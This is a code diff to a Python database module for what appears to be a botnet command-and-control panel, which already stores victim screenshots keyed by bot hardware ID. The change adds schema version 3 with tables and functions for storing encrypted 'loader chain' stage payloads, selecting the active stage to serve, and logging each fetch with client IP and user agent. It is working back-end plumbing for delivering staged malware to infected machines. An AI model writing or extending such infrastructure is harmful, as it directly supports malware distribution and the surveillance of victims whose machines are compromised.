@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)
 
 DB_PATH = Path(__file__).parent.parent.parent / "panel.db"
 DATA_DIR = Path(__file__).parent.parent.parent / "data"
-CURRENT_SCHEMA_VERSION = 2
+CURRENT_SCHEMA_VERSION = 3
 
 _db_lock = asyncio.Lock()
 _db_conn: aiosqlite.Connection | None = None
@@ -157,6 +157,40 @@ MIGRATIONS = {
             )""",
             "CREATE INDEX IF NOT EXISTS idx_screenshots_bot_hwid ON screenshots(bot_hwid)",
             "CREATE INDEX IF NOT EXISTS idx_screenshots_received_at ON screenshots(received_at DESC)",
+        ],
+    },
+    3: {
+        "description": "Add staging tables for loader chain payloads",
+        "up": [
+            # Staging payloads table - stores encrypted stage binaries
+            """CREATE TABLE IF NOT EXISTS staging_payloads (
+                id TEXT PRIMARY KEY,
+                stage_number INTEGER NOT NULL,
+                name TEXT NOT NULL,
+                description TEXT,
+                encrypted_blob BLOB NOT NULL,
+                encryption_key_hint TEXT,
+                size INTEGER NOT NULL,
+                sha256 TEXT NOT NULL,
+                is_active INTEGER DEFAULT 1,
+                created_at INTEGER NOT NULL,
+                created_by TEXT,
+                FOREIGN KEY (created_by) REFERENCES operators(id)
+            )""",
+            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_stage ON staging_payloads(stage_number)",
+            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_active ON staging_payloads(is_active)",
+            # Staging requests table - logs fetch attempts for detection
+            """CREATE TABLE IF NOT EXISTS staging_requests (
+                id TEXT PRIMARY KEY,
+                payload_id TEXT NOT NULL,
+                client_ip TEXT,
+                user_agent TEXT,
+                requested_at INTEGER NOT NULL,
+                served INTEGER DEFAULT 1,
+                FOREIGN KEY (payload_id) REFERENCES staging_payloads(id)
+            )""",
+            "CREATE INDEX IF NOT EXISTS idx_staging_requests_payload ON staging_requests(payload_id)",
+            "CREATE INDEX IF NOT EXISTS idx_staging_requests_time ON staging_requests(requested_at DESC)",
         ],
     },
 }
@@ -589,3 +623,104 @@ async def get_screenshot(screenshot_id: str) -> dict | None:
     async with db.execute("SELECT * FROM screenshots WHERE id = ?", (screenshot_id,)) as cursor:
         row = await cursor.fetchone()
         return dict(row) if row else None
+
+
+# =============================================================================
+# Staging payload functions
+# =============================================================================
+
+
+async def save_staging_payload(
+    payload_id: str,
+    stage_number: int,
+    name: str,
+    encrypted_blob: bytes,
+    size: int,
+    sha256: str,
+    description: str = None,
+    encryption_key_hint: str = None,
+    created_by: str = None,
+) -> None:
+    """Save a staging payload."""
+    db = await get_db()
+    async with _db_lock:
+        await db.execute(
+            """INSERT INTO staging_payloads
+               (id, stage_number, name, description, encrypted_blob, encryption_key_hint, size, sha256, is_active, created_at, created_by)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)""",
+            (payload_id, stage_number, name, description, encrypted_blob, encryption_key_hint, size, sha256, int(time.time()), created_by),
+        )
+        await db.commit()
+
+
+async def get_active_staging_payload(stage_number: int) -> dict | None:
+    """Get the active payload for a stage number."""
+    db = await get_db()
+    async with db.execute(
+        "SELECT * FROM staging_payloads WHERE stage_number = ? AND is_active = 1 ORDER BY created_at DESC LIMIT 1",
+        (stage_number,),
+    ) as cursor:
+        row = await cursor.fetchone()
+        return dict(row) if row else None
+
+
+async def get_staging_payload(payload_id: str) -> dict | None:
+    """Get a staging payload by ID."""
+    db = await get_db()
+    async with db.execute("SELECT * FROM staging_payloads WHERE id = ?", (payload_id,)) as cursor:
+        row = await cursor.fetchone()
+        return dict(row) if row else None
+
+
+async def list_staging_payloads(stage_number: int = None) -> list[dict]:
+    """List staging payloads, optionally filtered by stage."""
+    db = await get_db()
+    if stage_number is not None:
+        query = "SELECT id, stage_number, name, description, encryption_key_hint, size, sha256, is_active, created_at, created_by FROM staging_payloads WHERE stage_number = ? ORDER BY created_at DESC"
+        params = (stage_number,)
+    else:
+        query = "SELECT id, stage_number, name, description, encryption_key_hint, size, sha256, is_active, created_at, created_by FROM staging_payloads ORDER BY stage_number, created_at DESC"
+        params = ()
+    async with db.execute(query, params) as cursor:
+        return [dict(row) async for row in cursor]
+
+
+async def deactivate_staging_payload(payload_id: str) -> None:
+    """Deactivate a staging payload."""
+    db = await get_db()
+    async with _db_lock:
+        await db.execute(
+            "UPDATE staging_payloads SET is_active = 0 WHERE id = ?",
+            (payload_id,),
+        )
+        await db.commit()
+
+
+async def log_staging_request(
+    request_id: str,
+    payload_id: str,
+    client_ip: str = None,
+    user_agent: str = None,
+    served: bool = True,
+) -> None:
+    """Log a staging payload fetch request."""
+    db = await get_db()
+    async with _db_lock:
+        await db.execute(
+            "INSERT INTO staging_requests (id, payload_id, client_ip, user_agent, requested_at, served) VALUES (?, ?, ?, ?, ?, ?)",
+            (request_id, payload_id, client_ip, user_agent, int(time.time()), 1 if served else 0),
+        )
+        await db.commit()
+
+
+async def list_staging_requests(payload_id: str = None, limit: int = 100) -> list[dict]:
+    """List staging requests, optionally filtered by payload."""
+    db = await get_db()
+    if payload_id:
+        query = "SELECT * FROM staging_requests WHERE payload_id = ? ORDER BY requested_at DESC LIMIT ?"
+        params = (payload_id, limit)
+    else:
+        query = "SELECT * FROM staging_requests ORDER BY requested_at DESC LIMIT ?"
+        params = (limit,)
+    async with db.execute(query, params) as cursor:
+        return [dict(row) async for row in cursor]
